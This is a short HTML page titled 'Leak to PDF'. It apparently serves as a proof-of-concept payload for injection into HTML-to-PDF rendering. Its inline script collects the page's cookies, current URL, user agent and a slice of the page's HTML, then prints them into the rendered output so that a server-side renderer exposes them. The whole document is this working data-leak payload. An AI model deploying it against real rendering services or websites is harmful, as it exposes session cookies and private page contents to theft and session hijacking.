<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Leak to PDF</title></head>
<body>
<h1>Leaked Info</h1>
<pre id="leak"></pre>

<script>
  (function() {
    let leakText = "Cookies:\n" + document.cookie + "\n\n";
    leakText += "Current URL:\n" + window.location.href + "\n\n";
    leakText += "User Agent:\n" + navigator.userAgent + "\n\n";
    leakText += "HTML snippet:\n" + document.documentElement.outerHTML.slice(0, 1000);
    document.getElementById("leak").textContent = leakText;
  })();
</script>
</body>
</html>
